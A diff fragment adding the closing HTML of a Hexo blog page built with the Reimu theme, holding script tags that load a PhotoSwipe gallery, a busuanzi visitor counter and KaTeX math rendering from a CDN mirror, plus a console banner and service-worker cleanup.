+          cover: "/../images/17373827994914.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
